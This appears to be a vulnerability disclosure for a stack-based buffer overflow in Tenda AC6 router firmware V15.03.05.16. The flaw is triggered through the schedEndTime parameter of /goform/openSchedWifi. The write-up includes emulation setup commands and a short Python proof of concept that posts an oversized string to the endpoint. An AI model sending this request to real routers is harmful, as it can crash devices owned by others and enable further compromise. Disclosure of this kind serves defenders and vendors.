### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![image](https://github.com/user-attachments/assets/75eb2018-df60-4c06-bfb0-1920038a3a22)


### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```
### Vulnerability details


Tenda AC6 **V15.03.05.16** has a stack overflow vulnerability. The vulnerability affects the file /goform/openSchedWifi function setSchedWifi. Setting the schedEndTime parameter causes a stack-based buffer overflow.

![image](https://github.com/user-attachments/assets/d0e02466-66f8-4945-a3f4-f19493f1ee73)


![image](https://github.com/user-attachments/assets/e44effb1-3414-4cb3-adcf-01fcfd87edb7)


### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/openSchedWifi"

data = {
    "schedWifiEnable": "Raining101",
    "schedEndTime": "Raining" * 2000 
}

response = requests.post(url, data=data)
print(response.status_code)
print(response.text)
```

![image](https://github.com/user-attachments/assets/d78de198-bb74-4f25-ac0d-200c4516cc91)

